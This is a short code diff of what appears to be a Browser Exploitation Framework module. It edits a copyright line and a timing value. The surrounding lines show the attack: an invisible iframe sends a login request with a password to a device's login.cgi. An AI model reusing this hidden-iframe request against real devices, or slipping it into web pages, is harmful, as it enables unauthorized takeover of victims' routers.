@@ -1,5 +1,5 @@
 //
-//   Copyright 2012 Bart Leppens
+//   Copyright 2012 Wade Alcorn wade@bindshell.net
 //
 //   Licensed under the Apache License, Version 2.0 (the "License");
 //   you may not use this file except in compliance with the License.
@@ -21,7 +21,7 @@ beef.execute(function() {
   var gs_iframe = beef.dom.createInvisibleIframe();
   gs_login = function()  {
      var d = new Date;
-     var rtime = (d.getTime() / 200);
+     var rtime = (d.getTime() / 500);
      gs_iframe.setAttribute('src', base+'login.cgi?passwd='+oldpassword+'&rtime='+rtime);
   }
 
